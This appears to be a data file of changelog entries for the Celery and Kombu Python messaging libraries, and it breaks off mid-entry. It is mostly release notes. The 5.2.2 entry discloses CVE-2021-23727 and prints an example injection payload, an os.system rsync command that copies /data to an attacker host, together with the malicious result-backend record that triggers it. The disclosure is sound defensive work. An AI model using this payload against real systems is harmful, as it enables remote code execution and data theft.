test_mutable_errback_called_by_chord_from_group_fail_multiple by Nusnus in 7837\n- Use SPDX license expression in project metadata by RazerM in 7845\n- New control command revoke_by_stamped_headers by Nusnus in 7838\n- Clarify wording in Redis priority docs by strugee in 7853\n- Fix non working example of using celery_worker pytest fixture by paradox-lab in 7857\n- Removed the mandatory requirement to include stamped_headers key when implementing on_signature() by Nusnus in 7856\n- Update serializer docs by sondrelg in 7858\n- Remove reference to old Python version by Kludex in 7829\n- Added on_replace() to Task to allow manipulating the replaced sig with custom changes at the end of the task.replace() by Nusnus in 7860\n- Add clarifying information to completed_count documentation by hankehly in 7873\n- Stabilized test_revoked_by_headers_complex_canvas by Nusnus in 7877\n- StampingVisitor will visit the callbacks and errbacks of the signature by Nusnus in 7867\n- Fix \"rm: no operand\" error in clean-pyc script by hankehly in 7878\n- Add --skip-checks flag to bypass django core checks by mudetz in 7859\n- Scheduled weekly dependency update for week 44 by pyup-bot in 7868\n- Added two new unit tests to callback stamping by Nusnus in 7882\n- Sphinx extension: use inspect.signature to make it Python 3.11 compatible by mathiasertl in 7879\n- cryptography==38.0.3 by auvipy in 7886\n- Canvas.py doc enhancement by Nusnus in 7889\n- Fix typo by sondrelg in 7890\n- fix typos in optional tests by hsk17 in 7876\n- Canvas.py doc enhancement by Nusnus in 7891\n- Fix revoke by headers tests stability by Nusnus in 7892\n- feat: add global keyprefix for backend result keys by kaustavb12 in 7620\n- Canvas.py doc enhancement by Nusnus in 7897\n- fix(sec): upgrade sqlalchemy to 1.2.18 by chncaption in 7899\n- Canvas.py doc enhancement by Nusnus in 7902\n- Fix test warnings by ShaheedHaque in 7906\n- Support for out-of-tree worker pool implementations by ShaheedHaque in 7880\n- Canvas.py doc enhancement by Nusnus in 7907\n- Use bound task in base task example. Closes 7909 by WilliamDEdwards in 7910\n- Allow the stamping visitor itself to set the stamp value type instead of casting it to a list by Nusnus in 7914\n- Stamping a task left the task properties dirty by Nusnus in 7916\n- Fixed bug when chaining a chord with a group by Nusnus in 7919\n- Fixed bug in the stamping visitor mechanism where the request was lacking the stamps in the 'stamps' property by Nusnus in 7928\n- Fixed bug in task_accepted() where the request was not added to the requests but only to the active_requests by Nusnus in 7929\n- Fix bug in TraceInfo._log_error() where the real exception obj was hiding behind 'ExceptionWithTraceback' by Nusnus in 7930\n- Added integration test: test_all_tasks_of_canvas_are_stamped() by Nusnus in 7931\n- Added new example for the stamping mechanism: examples/stamping by Nusnus in 7933\n- Fixed a bug where replacing a stamped task and stamping it again by Nusnus in 7934\n- Bugfix for nested group stamping on task replace by Nusnus in 7935\n- Added integration test test_stamping_example_canvas() by Nusnus in 7937\n- Fixed a bug in losing chain links when unchaining an inner chain with links by Nusnus in 7938\n- Removing as not mandatory by auvipy in 7885\n- Housekeeping for Canvas.py by Nusnus in 7942\n- Scheduled weekly dependency update for week 50 by pyup-bot in 7954\n- try pypy 3.9 in CI by auvipy in 7956\n- sqlalchemy==1.4.45 by auvipy in 7943\n- billiard>=4.1.0,<5.0 by auvipy in 7957\n- feat(typecheck): allow changing type check behavior on the app level; by moaddib666 in 7952\n- Add broker_channel_error_retry option by nkns165 in 7951\n- Add beat_cron_starting_deadline_seconds to prevent unwanted cron runs by abs25 in 7945\n- Scheduled weekly dependency update for week 51 by pyup-bot in 7965\n- Added doc to \"retry_errors\" newly supported field of \"publish_retry_policy\" of the task namespace by Nusnus in 7967\n- Renamed from master to main in the docs and the CI workflows by Nusnus in 7968\n- Fix docs for the exchange to use with worker_direct by alessio-b2c2 in 7973\n- Pin redis==4.3.4 by auvipy in 7974\n- return list of nodes to make sphinx extension compatible with Sphinx 6.0 by mathiasertl in 7978\n- use version range redis>=4.2.2,<4.4.0 by auvipy in 7980\n- Scheduled weekly dependency update for week 01 by pyup-bot in 7987\n- Add annotations to minimise differences with celery-aio-pool's tracer.py. by ShaheedHaque in 7925\n- Fixed bug where linking a stamped task did not add the stamp to the link's options by Nusnus in 7992\n- sqlalchemy==1.4.46 by auvipy in 7995\n- pytz by auvipy in 8002\n- Fix few typos, provide configuration + workflow for codespell to catch any new by yarikoptic in 8023\n- RabbitMQ links update by arnisjuraga in 8031\n- Ignore files generated by tests by Kludex in 7846\n- Revert \"sqlalchemy==1.4.46 (7995)\" by Nusnus in 8033\n- Fixed bug with replacing a stamped task with a chain or a group (inc. links/errlinks) by Nusnus in 8034\n- Fixed formatting in setup.cfg that caused flake8 to misbehave by Nusnus in 8044\n- Removed duplicated import Iterable by Nusnus in 8046\n- Fix docs by Nusnus in 8047\n- Document --logfile default by strugee in 8057\n- Stamping Mechanism Refactoring by Nusnus in 8045\n- result_backend_thread_safe config shares backend across threads by CharlieTruong in 8058\n- Fix cronjob that use day of month and negative UTC timezone by pkyosx in 8053\n- Stamping Mechanism Examples Refactoring by Nusnus in 8060\n- Fixed bug in Task.on_stamp_replaced() by Nusnus in 8061\n- Stamping Mechanism Refactoring 2 by Nusnus in 8064\n- Changed default append_stamps from True to False (meaning duplicates \u2026 by Nusnus in 8068\n- typo in comment: mailicious => malicious by yanick in 8072\n- Fix command for starting flower with specified broker URL by ShukantPal in 8071\n- Improve documentation on ETA/countdown tasks (8069) by norbertcyran in 8075\n\n.. _version-5.3.0b1:\n\n", "5.3.0b1": "=======\n\n:release-date: 2022-08-01 5:15 P.M UTC+6:00\n:release-by: Asif Saif Uddin\n\n- Canvas Header Stamping (7384).\n- async chords should pass it's kwargs to the group/body.\n- beat: Suppress banner output with the quiet option (7608).\n- Fix honor Django's TIME_ZONE setting.\n- Don't warn about DEBUG=True for Django.\n- Fixed the on_after_finalize cannot access tasks due to deadlock.\n- Bump kombu>=5.3.0b1,<6.0.\n- Make default worker state limits configurable (7609).\n- Only clear the cache if there are no active writers.\n- Billiard 4.0.1\n\n.. _version-5.3.0a1:\n\n", "5.3.0a1": "=======\n\n:release-date: 2022-06-29 5:15 P.M UTC+6:00\n:release-by: Asif Saif Uddin\n\n- Remove Python 3.4 compatibility code.\n- call ping to set connection attr for avoiding redis parse_response error.\n- Use importlib instead of deprecated pkg_resources.\n- fix 7245 uid duplicated in command params.\n- Fix subscribed_to maybe empty (7232).\n- Fix: Celery beat sleeps 300 seconds sometimes even when it should run a task within a few seconds (e.g. 13 seconds) 7290.\n- Add security_key_password option (7292).\n- Limit elasticsearch support to below version 8.0.\n- try new major release of pytest 7 (7330).\n- broker_connection_retry should no longer apply on startup (7300).\n- Remove __ne__ methods (7257).\n- fix 7200 uid and gid.\n- Remove exception-throwing from the signal handler.\n- Add mypy to the pipeline (7383).\n- Expose more debugging information when receiving unknown tasks. (7405)\n- Avoid importing buf_t from billiard's compat module as it was removed.\n- Avoid negating a constant in a loop. (7443)\n- Ensure expiration is of float type when migrating tasks (7385).\n- load_extension_class_names - correct module_name (7406)\n- Bump pymongo[srv]>=4.0.2.\n- Use inspect.getgeneratorstate in asynpool.gen_not_started (7476).\n- Fix test with missing .get() (7479).\n- azure-storage-blob>=12.11.0\n- Make start_worker, setup_default_app reusable outside of pytest.\n- Ensure a proper error message is raised when id for key is empty (7447).\n- Crontab string representation does not match UNIX crontab expression.\n- Worker should exit with ctx.exit to get the right exitcode for non-zero.\n- Fix expiration check (7552).\n- Use callable built-in.\n- Include dont_autoretry_for option in tasks. (7556)\n- fix: Syntax error in arango query.\n- Fix custom headers propagation on task retries (7555).\n- Silence backend warning when eager results are stored.\n- Reduce prefetch count on restart and gradually restore it (7350).\n- Improve workflow primitive subclassing (7593).\n- test kombu>=5.3.0a1,<6.0 (7598).\n- Canvas Header Stamping (7384).\n\n.. _version-5.2.7:\n\n", "5.2.4": "=====\n\n:release-date: 2022-4-03 20:30 P.M UTC+2:00\n:release-by: Omer Katz\n\n- Expose more debugging information when receiving unknown tasks (7404).\n\n.. _version-5.2.3:\n\n", "5.2.3": "=====\n\n:release-date: 2021-12-29 12:00 P.M UTC+6:00\n:release-by: Asif Saif Uddin\n\n- Allow redis >= 4.0.2.\n- Upgrade minimum required pymongo version to 3.11.1.\n- tested pypy3.8 beta (6998).\n- Split Signature.__or__ into subclasses' __or__ (7135).\n- Prevent duplication in event loop on Consumer restart.\n- Restrict setuptools>=59.1.1,<59.7.0.\n- Kombu bumped to v5.2.3\n- py-amqp bumped to v5.0.9\n- Some docs & CI improvements.\n\n\n.. _version-5.2.2:\n\n", "5.2.2": "=====\n\n:release-date: 2021-12-26 16:30 P.M UTC+2:00\n:release-by: Omer Katz\n\n- Various documentation fixes.\n- Fix CVE-2021-23727 (Stored Command Injection security vulnerability).\n\n    When a task fails, the failure information is serialized in the backend.\n    In some cases, the exception class is only importable from the\n    consumer's code base. In this case, we reconstruct the exception class\n    so that we can re-raise the error on the process which queried the\n    task's result. This was introduced in 4836.\n    If the recreated exception type isn't an exception, this is a security issue.\n    Without the condition included in this patch, an attacker could inject a remote code execution instruction such as:\n    ``os.system(\"rsync /data attacker192.168.56.100:~/data\")``\n    by setting the task's result to a failure in the result backend with the os,\n    the system function as the exception type and the payload ``rsync /data attacker192.168.56.100:~/data`` as the exception arguments like so:\n\n    .. code-block:: python\n\n        {\n              \"exc_module\": \"os\",\n              'exc_type': \"system\",\n              \"exc_message\": \"rsync /data attacker192.168.56.100:~/data\"\n        }\n\n    According to my analysis, this vulnerability can only be exploited if\n    the producer delayed a task which runs long enough for the\n    attacker to change the result mid-flight, and the producer has\n    polled for the task's result.\n    The attacker would also have to gain access to the result backend.\n    The severity of this security vulnerability is low, but we still\n    recommend upgrading.\n\n\n.. _version-5.2.1:\n\n", "5.2.1": "=====\n\n:release-date: 2021-11-16 8.55 P.M UTC+6:00\n:release-by: Asif Saif Uddin\n\n- Fix rstrip usage on bytes instance in ProxyLogger.\n- Pass logfile to ExecStop in celery.service example systemd file.\n- fix: reduce latency of AsyncResult.get under gevent (7052)\n- Limit redis version: <4.0.0.\n- Bump min kombu version to 5.2.2.\n- Change pytz>dev to a PEP 440 compliant pytz>0.dev.0.\n- Remove dependency to case (7077).\n- fix: task expiration is timezone aware if needed (7065).\n- Initial testing of pypy-3.8 beta to CI.\n- Docs, CI & tests cleanups.\n\n\n.. _version-5.2.0:\n\n", "5.2.0rc1": "========\n:release-date: 2021-09-26 4.04 P.M UTC+3:00\n:release-by: Omer Katz\n\n- Kill all workers when main process exits in prefork model (6942).\n- test kombu 5.2.0rc1 (6947).\n- try moto 2.2.x (6948).\n- Prepared Hacker News Post on Release Action.\n- update setup with python 3.7 as minimum.\n- update kombu on setupcfg.\n- Added note about automatic killing all child processes of worker after its termination.\n- [pre-commit.ci] pre-commit autoupdate.\n- Move importskip before greenlet import (6956).\n- amqp: send expiration field to broker if requested by user (6957).\n- Single line drift warning.\n- canvas: fix kwargs argument to prevent recursion (6810) (6959).\n- Allow to enable Events with app.conf mechanism.\n- Warn when expiration date is in the past.\n- Add the Framework :: Celery trove classifier.\n- Give indication whether the task is replacing another (6916).\n- Make setup.py executable.\n- Bump version: 5.2.0b3 \u2192 5.2.0rc1.\n\n.. _version-5.2.0b3:\n\n", "5.1.0b1": "=======\n:release-date: 2021-04-01 10:30 P.M UTC+6:00\n:release-by: Asiff Saif Uddin\n\n- Wheels are no longer universal.\n- Revert \"Added redis transport key_prefix from envvars\".\n- Redis Transport: Small improvements of `SentinelChannel` (1253).\n- Fix pidbox not using default channels.\n- Revert \"on worker restart - restore visible regardless to time (905)\".\n- Add vine to dependencies.\n- Pin urllib3<1.26 to fix failing unittests.\n- Add timeout to producer publish (1269).\n- Remove python2 compatibility code (1277).\n- redis: Support Sentinel with SSL.\n- Support for Azure Service Bus 7.0.0 (1284).\n- Allow specifying session token (1283).\n- kombu/asynchronous/http/curl: implement _set_timeout.\n- Disable namedtuple to object feature in simplejson (1297).\n- Update to tox docker 2.0.\n- SQS back-off policy (1301).\n- Fixed SQS unittests.\n- Fix: non kombu json message decoding in SQS transport (1306).\n- Add Github Actions CI (1309).\n- Update default pickle protocol version to 4 (1314).\n- Update connection.py (1311).\n- Drop support for the lzma backport.\n- Drop obsolete code importing pickle (1315).\n- Update default login method for librabbitmq and pyamqp (936).\n- SQS Broker - handle STS authentication with AWS (1322).\n- Min py-amqp version is v5.0.6 (1325).\n- Numerous docs & example fixes.\n- Use a thread-safe implementation of cached_property (1316).\n\n\n.. _version-5.0.2:\n\n", "4.6.11": "=======\n:release-date: 2020-06-24 1.15 P.M UTC+6:00\n:release-by: Asif Saif Uddin\n\n- Revert incompatible changes in 1193 and additional improvements (1211)\n- Default_channel should reconnect automatically (1209)\n\n\n.. _version-4.6.10:\n\n", "4.6.10": "======\n:release-date: 2020-06-03 10.45 A.M UTC+6:00\n:release-by: Asif Saif Uddin\n\n- Doc improvement.\n- set _connection in _ensure_connection (1205)\n- Fix for the issue 1172\n- reuse connection [bug fix]\n\n\n.. _version-4.6.9:\n\n", "4.6.9": "=====\n:release-date: 2020-06-01 14.00 P.M UTC+6:00\n:release-by: Asif Saif Uddin\n\n- Prevent failure if AWS creds are not explicitly defined on predefined.\n- Raise RecoverableConnectionError in maybe_declare with retry on and.\n- Fix for the issue 1172 .\n- possible fix for 1174 .\n- Fix: make SQLAlchemy Channel init thread-safe\n- Added integration testing infrastructure for RabbitMQ\n- Initial redis integration tests implementation\n- SQLAlchemy transport: Use Query.with_for_update() instead of deprecated\n- Fix Consumer Encoding\n- Added Integration tests for direct, topic and fanout exchange types\n- Added TTL integration tests\n- Added integration tests for priority queues\n- fix 100% cpu usage on linux while using sqs\n- Modified Mutex to use redis LuaLock implementation\n- Fix: eliminate remaining race conditions from SQLAlchemy Channel\n- Fix connection imaybe_declare (1196)\n- Fix for issue 1198: Celery crashes in cases where there aren\u2019t enough\n- Ensure connection when connecting to broker\n- update pyamqp to 2.6 with optional cythonization\n\n.. _version-4.6.8:\n\n", "4.6.8": "=====\n:release-date: 2020-03-29 20:45 A.M UTC+6:00\n:release-by: Asif Saif Uddin\n\n- Added support for health_check_interval option in broker_transport_options (1145)\n- Added retry_on_timeout parameter to Redis Channel (1150)\n- Added support for standard values for ssl_cert_reqs query parameter for Redis (1139)\n- Added predefined_queues option to SQS transport (1156)\n- Added ssl certificate verification against ca certificates when amqps is used for pyamqp transport (1151)\n- Fix issue (701) where kombu.transport.redis.Mutex is broken in python 3 (1141)\n- Fix brop error in Redis Channel (1144)\n\n.. _version-4.6.7:\n\n", "4.6.7": "=====\n:release-date: 2019-12-07 20:45 A.M UTC+6:00\n:release-by: Asif Saif Uddin\n\n- Use importlib.metadata from the standard library on Python 3.8+ (1086).\n- Add peek lock settings to be changed using transport options (1119).\n- Fix redis health checks (1122).\n- Reset ready before execute callback (1126).\n- Add missing parameter queue_args in kombu.connection.SimpleBuffer (1128)\n\n.. _version-4.6.6:\n\n", "4.6.6": "=====\n:release-date: 2019-11-11 00:15 A.M UTC+6:00\n:release-by: Asif Saif Uddin\n\n- Revert _lookup_direct and related changes of redis.\n- Python 3.8 support\n- Fix 'NoneType' object has no attribute 'can_read' bug of redis transport\n- Issue 1019 Fix redis transport socket timeout\n- Add wait timeout settings to receive queue message (1110)\n- Bump py-amqp to 2.5.2\n\n.. _version-4.6.5:\n\n", "4.6.5": "=====\n:release-date: 2019-09-30 19:30 P.M UTC+6:00\n:release-by: Asif Saif Uddin\n\n- Revert _lookup api and correct redis implemetnation.\n- Major overhaul of redis test cases by adding more full featured fakeredis module.\n- Add more test cases to boost coverage of kombu redis transport.\n- Refactor the producer consumer test cases to be based on original mocks and be passing\n- Fix lingering line length issue in test.\n- Sanitise url when include_password is false\n- Pinned pycurl to 7.43.0.2 as it is the latest build with wheels provided\n- Bump py-amqp to 2.5.2\n\n\n.. _version-4.6.4:\n\n", "4.6.4": "=====\n:release-date: 2019-08-14 22:45 P.M UTC+6:00\n:release-by: Asif Saif Uddin\n\n- Use importlib-metadata instead of pkg_resources for better performance\n- Allow users to switch URLs while omitting the resource identifier (1032)\n- Don't stop receiving tasks on 503 SQS error. (1064)\n- Fix maybe declare (1066)\n- Revert \"Revert \"Use SIMEMBERS instead of SMEMBERS to check for queue (Redis Broker)\n- Fix MongoDB backend to work properly with TTL (1076)\n- Make sure that max_retries=0 is treated differently than None (1080)\n- Bump py-amqp to 2.5.1\n\n\n.. _version-4.6.3:\n\n", "4.6.3": "=====\n:release-date: 2019-06-15 12:45 A.M UTC+6:00\n:release-by: Asif Saif Uddin\n\n- Revert FastUUID for kombu 4.6\n\n\n.. _version-4.6.2:\n\n", "4.6.2": "=====\n:release-date: 2019-06-15 12:45 A.M UTC+6:00\n:release-by: Asif Saif Uddin\n\n- Fix sbugs and regressions\n\n\n.. _version-4.6.1:\n\n", "4.6.1": "=====\n:release-date: 2019-06-06 10:30 A.M UTC+6:00\n:release-by: Asif Saif Uddin\n\n- Fix some newly introduced bug in kombu 4.6\n\n.. _version-4.6.0:\n\n", "4.6.0": "=====\n:release-date: 2019-05-30 15:30 P.M UTC+6:00\n:release-by: Asif Saif Uddin\n\n- Dropped python 3.4\n\n- Bump py-amqp to 2.5.0\n\n- Use SIMEMBERS instead of SMEMBERS to check for queue (redis broker)\n\n  * Add `_lookup_direct` method to virtual channel. (994)\n\n  Add possibility to optimize lookup for queue in direct\n  exchange set.\n\n  * Add `_lookup_direct` method to redis virtual channel. (994)\n\n  Use `SISMEMBER` instead of `SMEMBERS` command to check if queue\n  exists in a set. Time complexity is increased from O(N) to O(1)\n  where N is the set cardinality.\n\n  Contributed by **Stevan Milic** and **Asif Saif Uddin**\n\n- Include priority in properties only if it's not None.\n  Since we attempt to serialize the priority property if it exists\n  in the dictionary it must be an integer.\n\n  Contributed by **Omer Katz**\n\n- Removed dangerous default mutable arguments from function\n  definitions where appropriate.\n\n  Contributed by **Todd Cook**\n\n- Codebase improvements and fixes by:\n\n  - **Omer Katz**\n  - **Asif Saif Uddin**\n\n.. _version-4.5.0:\n\n", "4.5.0": "=====\n:release-date: 2019-03-3 18:30 P.M UTC+3:00\n:release-by: Omer Katz\n\n- The Redis transport now supports a custom separator for keys.\n\n  Previously when storing a key in Redis which represents a queue\n  we used the hardcored value ``\\x06\\x16`` separator to store\n  different attributes of the queue in the queue's name.\n\n  The separator is now configurable using the sep\n  transport option:\n\n  .. code-block:: python\n\n    with Connection('redis://', transport_options={\n            'sep': ':',\n        }):\n         ...\n        pass\n\n  Contributed by **Joris Beckers**\n\n- When the SQS server returns a timeout we ignore it and keep trying\n  instead of raising an error.\n\n  This will prevent Celery from raising an error and hanging.\n\n  Contributed by **Erwin Rossen**\n\n- Properly declare async support for the Qpid transport.\n\n  If you are using this transport we strongly urge you to upgrade.\n\n  Contributed by **Rohan McGovern**\n\n- Revert `celery/kombu906 <https://github.com/celery/kombu/pull/906>`_ and\n  introduce unique broadcast queue names as an optional keyword argument.\n\n  If you want each broadcast queue to have a unique name specify `unique=True`:\n\n  .. code-block:: pycon\n\n    >>> from kombu.common import Broadcast\n    >>> q = Broadcast(queue='foo', unique=True)\n    >>> q.name\n    'foo.7ee1ac20-cda3-4966-aaf8-e7a3bb548688'\n    >>> q = Broadcast(queue='foo')\n    >>> q.name\n    'foo'\n\n- Codebase improvements and fixes by:\n\n  - **Omer Katz**\n\n.. _version-4.4.0:\n\n", "4.4.0": "=====\n:release-date: 2019-03-3 9:00 P.M UTC+2:00\n:release-by: Omer Katz\n\n- Restore bz2 import checks in compression module.\n\n  The checks were removed in `celery/kombu938 <https://github.com/celery/kombu/pull/938>`_ due to assumption that it only affected Jython.\n  However, bz2 support can be missing in Pythons built without bz2 support.\n\n  Contributed by **Patrick Woods**\n\n- Fix regression that occurred in 4.3.0\n  when parsing  Redis Sentinel master URI containing password.\n\n  Contributed by **Peter Lithammer**\n\n- Handle the case when only one Redis Sentinel node is provided.\n\n  Contributed by **Peter Lithammer**\n\n- Support SSL URL parameters correctly for `rediss://`` URIs.\n\n  Contributed by **Paul Bailey**\n\n- Revert `celery/kombu954 <https://github.com/celery/kombu/pull/954>`_.\n  Instead bump the required redis-py dependency to 3.2.0\n  to include this fix `andymccurdy/redis-py4e1e748 <https://github.com/andymccurdy/redis-py/commit/4e1e74809235edc19e03edb79c97c80a3e4e9eca>`_.\n\n  Contributed by **Peter Lithammer**\n\n- Added support for broadcasting using a regular expression pattern\n  or a glob pattern to multiple Pidboxes.\n\n  Contributed by **Jason Held**\n\n.. _version-4.3.0:\n\n", "4.3.0": "=====\n:release-date: 2019-01-14 7:00 P.M UTC+2:00\n:release-by: Omer Katz\n\n- Added Python 3.7 support.\n\n  Contributed by **Omer Katz**, **Mads Jensen** and **Asif Saif Uddin**\n\n- Avoid caching queues which are declared with a TTL.\n\n  Queues that are declared with a TTL are now also be excluded from the\n  in-memory cache in case they expire between publishes on the same channel.\n\n  Contributed by **Matt Yule-Bennett**\n\n- Added an index to the Message table for the SQLAlchemy transport.\n\n  The index allows to effectively sorting the table by the message's timestamp.\n\n  .. note::\n\n    We do not provide migrations for this model yet.\n    You will need to add the index manually if you are already\n    using the SQLAlchemy transport.\n\n    The syntax may vary between databases.\n    Please refer to your database's documentation for instructions.\n\n  Contributed by **Mikhail Shcherbinin**\n\n- Added a timeout that limits the amount of time we retry\n  to reconnect to a transport.\n\n  Contributed by **:github_user:`tothegump`**\n\n- :class:``celery.asynchronous.hub.Hub`` is now reentrant.\n\n  This allows calling :func:`celery.bin.celery.main` to revive a worker in\n  the same process after rescuing from shutdown (:class:``SystemExit``).\n\n  Contributed by **Alan Justino da Silva**\n\n- Queues now accept string exchange names as arguments as documented.\n\n  Tests were added to avoid further regressions.\n\n  Contributed by **Antonio Gutierrez**\n\n- Specifying names for broadcast queues now work as expected.\n\n  Previously, named broadcast queues did not create multiple queues per worker.\n  They incorrectly declared the named queue which resulted in one queue per\n  fanout exchange, thus missing the entire point of a fanout exchange.\n  The behavior is now matched to unnamed broadcast queues.\n\n  Contributed by **Kuan Hsuan-Tso**\n\n- When initializing the Redis transport in conjunction with gevent\n  restore all unacknowledged messages to queue.\n\n  Contributed by **Gal Cohen**\n\n- Allow :class:``kombu.simple.SimpleQueue`` to pass queue_arguments to Queue object.\n\n  This allows :class:``kombu.simple.SimpleQueue`` to connect to RabbitMQ queues with\n  custom arguments like 'x-queue-mode'='lazy'.\n\n  Contributed by **C Blue Neeh**\n\n- Add support for 'rediss' scheme for secure Redis connections.\n\n  The rediss scheme defaults to the least secure form, as\n  there is no suitable default location for `ca_certs`. The recommendation\n  would still be to follow the documentation and specify `broker_use_ssl` if\n  coming from celery.\n\n  Contributed by **Daniel Blair**\n\n- Added the Azure Storage Queues transport.\n\n  The transport is implemented on top of Azure Storage\n  Queues. This offers a simple but scalable and low-cost PaaS\n  transport for Celery users in Azure. The transport is intended to be\n  used in conjunction with the Azure Block Blob Storage backend.\n\n  Contributed by **Clemens Wolff**, **:github_user:`ankurokok`**,\n  **Denis Kisselev**, **Evandro de Paula**, **Martin Peck**\n  and **:github_user:`michaelperel`**\n\n- Added the Azure Service Bus transport.\n\n  The transport is implemented on top of Azure Service Bus and\n  offers PaaS support for more demanding Celery workloads in Azure.\n  The transport is intended to be used in conjunction with the Azure\n  CosmosDB backend.\n\n  Contributed by **Clemens Wolff**, **:github_user:`ankurokok`**,\n  **Denis Kisselev**, **Evandro de Paula**, **Martin Peck**\n  and **:github_user:`michaelperel`**\n\n- Drop remaining mentions of Jython support completely.\n\n  Contributed by **Asif Saif Uddin** and **Mads Jensen**\n\n- When publishing messages to the Pidbox, retry if an error occurs.\n\n  Contributed by **Asif Saif Uddin**\n\n- Fix infinite loop in :method:``kombu.asynchronous.hub.Hub.create_loop``.\n\n  Previous attempt to fix the problem (PR kombu/760) did not consider\n  an edge case. It is now fixed.\n\n  Contributed by **Vsevolod Strukchinsky**\n\n- Worker shutdown no longer duplicates messages when using the SQS broker.\n\n  Contributed by **Mintu Kumar Sah**\n\n- When using the SQS broker, prefer boto's default region before our hardcoded default.\n\n  Contributed by **Victor Villas**\n\n- Fixed closing of shared redis sockets which previously caused Celery to hang.\n\n  Contributed by **Alexey Popravka**\n\n- the `Pyro`_ transport (:mod:`kombu.transport.pyro`) now works with\n  recent Pyro versions. Also added a Pyro Kombu Broker that this transport\n  needs for its queues.\n\n  Contributed by **Irmen de Jong**\n\n- Handle non-base64-encoded SQS messages.\n\n  Fix contributed by **Tim Li**, **Asif Saif Uddin** and **Omer Katz**.\n\n- Move the handling of Sentinel failures to the redis library itself.\n\n  Previously, Redis Sentinel worked only if the first node's sentinel\n  service in the URI was up. A server outage would have caused downtime.\n\n  Contributed by **Brian Price**\n\n- When using Celery and the pickle serializer with binary data as part of the\n  payload, `UnicodeDecodeError` would be raised as the content was not utf-8.\n  We now replace on errors.\n\n  Contributed by **Jian Dai**\n\n- Allow setting :method:``boto3.sqs.create_queue`` Attributes via transport_options.\n\n  Contributed by **Hunter Fernandes**\n\n- Fixed infinite loop when entity.channel is replaced by revive() on connection\n  drop.\n\n  Contributed by **Tzach Yarimi**\n\n- Added optional support for Brotli compression.\n\n  Contributed by **Omer Katz**\n\n- When using the SQS broker, FIFO queues with names that ended with the 'f' letter\n  were incorrectly parsed. This is now fixed.\n\n  Contributed by **Alex Vishnya** and **Ilya Konstantinov**\n\n-  Added optional support for LZMA compression.\n\n  Contributed by **Omer Katz**\n\n- Added optional support for ZStandard compression.\n\n  Contributed by **Omer Katz**\n\n- Require py-amqp 2.4.0 as the minimum version.\n\n  Contributed by **Asif Saif Uddin**\n\n- The value of DISABLE_TRACEBACKS environment variable is now respected on debug, info\n  and warning logger level.\n\n  Contributed by **Ludovic Rivallain**\n\n- As documented in kombu/741 and eventlet/eventlet415\n  there is a mismatch between the monkey-patched eventlet queue\n  and the interface Kombu is expecting.\n  This causes Celery to crash when the `broker_pool_limit`\n  configuration option is set\n  eventlet/eventlet415 suggests that the mutex can be a noop.\n  This is now the case.\n\n  Contributed by **Josh Morrow**\n\n- Codebase improvements and fixes by:\n\n  - **Omer Katz**\n  - **Mads Jensen**\n  - **Asif Saif Uddin**\n  - **Lars Rinn**\n\n- Documentation improvements by:\n\n  - **Jon Dufresne**\n  - **Fay Cheng**\n  - **Asif Saif Uddin**\n  - **Kyle Verhoog**\n  - **Noah Hall**\n  - **:github_user:`brabiega`**\n\n.. _version-4.2.2-post1:\n\n", "4.2.2post1": "===========\n:release-date: 2019-01-01 04:00 P.M IST\n:release-by: Omer Katz\n\n.. note::\n\n  The previous release contained code from master.\n  It is now deleted from PyPi.\n  Please use this release instead.\n\n- No changes since previous release.\n\n.. _version-4.2.2:\n\n", "4.2.2": "=====\n:release-date: 2018-12-06 04:30 P.M IST\n:release-by: Omer Katz\n\n- Support both Redis client version 2.x and version 3.x.\n\n  Contributed by **Ash Berlin-Taylor** and **Jeppe Fihl-Pearson**\n\n.. _version-4.2.1:\n\n", "4.2.1": "=====\n:release-date: 2018-05-21 09:00 A.M IST\n:release-by: Omer Katz\n\n.. note::\n\n  The 4.2.0 release contained remains of the ``async`` module by accident.\n  This is now fixed.\n\n- Handle librabbitmq fileno raising a ValueError when socket is not connected.\n\n  Contributed by **Bryan Shelton**\n\n.. _version-4.2.0:\n\n", "4.0": "===\n:release-date: 2016-10-28 16:45 P.M UTC\n:release-by: Ask Solem\n\n- Now depends on :mod:`amqp` 2.0.\n\n    The new py-amqp version have been refactored for better performance,\n    using modern Python socket conventions, and API consistency.\n\n- No longer depends on :mod:`anyjson`.\n\n    Kombu will now only choose between :pypi:`simplejson` and the built-in\n    :mod:`json`.\n\n    Using the latest version of simplejson is recommended:\n\n    .. code-block:: console\n\n        $ pip install -U simplejson\n\n- Removed transports that are no longer supported in this version:\n\n    - Django ORM transport\n    - SQLAlchemy ORM transport\n    - Beanstalk transport\n    - ZeroMQ transport\n    - amqplib transport (use pyamqp).\n\n- API Changes\n\n    * Signature of :class:`kombu.Message` now takes body as first argment.\n\n        It used to be ``Message(channel, body=body, **kw)``, but now it's\n        ``Message(body, channel=channel, **kw)``.\n\n        This is unlikey to affect you, as the Kombu API does not have\n        users instantiate messages manually.\n\n- New SQS transport\n\n    Donated by NextDoor, with additional contributions from mdk.\n\n    .. note::\n\n        ``kombu[sqs]`` now depends on :pypi:`pycurl`.\n\n- New Consul transport.\n\n    Contributed by **Wido den Hollander**.\n\n- New etcd transport.\n\n    Contributed by **Stephen Milner**.\n\n- New Qpid transport.\n\n    It was introduced as an experimental transport in Kombu 3.0, but is now\n    mature enough to be fully supported.\n\n    Created and maintained by **Brian Bouterse**.\n\n- Redis: Priority 0 is now lowest, 9 is highest.\n  (**backward incompatible**)\n\n    This to match how priorities in AMQP works.\n\n    Fix contributed by **Alex Koshelev**.\n\n- Redis: Support for Sentinel\n\n    You can point the connection to a list of sentinel URLs like:\n\n    .. code-block:: text\n\n        sentinel://0.0.0.0:26379;sentinel://0.0.0.0:26380/...\n\n    where each sentinel is separated by a `;`. Multiple sentinels are handled\n    by :class:`kombu.Connection` constructor, and placed in the alternative\n    list of servers to connect to in case of connection failure.\n\n   Contributed by **Sergey Azovskov**, and **Lorenzo Mancini**\n\n- RabbitMQ Queue Extensions\n\n    New arguments have been added to :class:`kombu.Queue` that lets\n    you directly and conveniently configure the RabbitMQ queue extensions.\n\n    - ``Queue(expires=20.0)``\n\n        Set queue expiry time in float seconds.\n\n        See :attr:`kombu.Queue.expires`.\n\n    - ``Queue(message_ttl=30.0)``\n\n        Set queue message time-to-live float seconds.\n\n        See :attr:`kombu.Queue.message_ttl`.\n\n    - ``Queue(max_length=1000)``\n\n        Set queue max length (number of messages) as int.\n\n        See :attr:`kombu.Queue.max_length`.\n\n    - ``Queue(max_length_bytes=1000)``\n\n        Set queue max length (message size total in bytes) as int.\n\n        See :attr:`kombu.Queue.max_length_bytes`.\n\n    - ``Queue(max_priority=10)``\n\n        Declare queue to be a priority queue that routes messages\n        based on the ``priority`` field of the 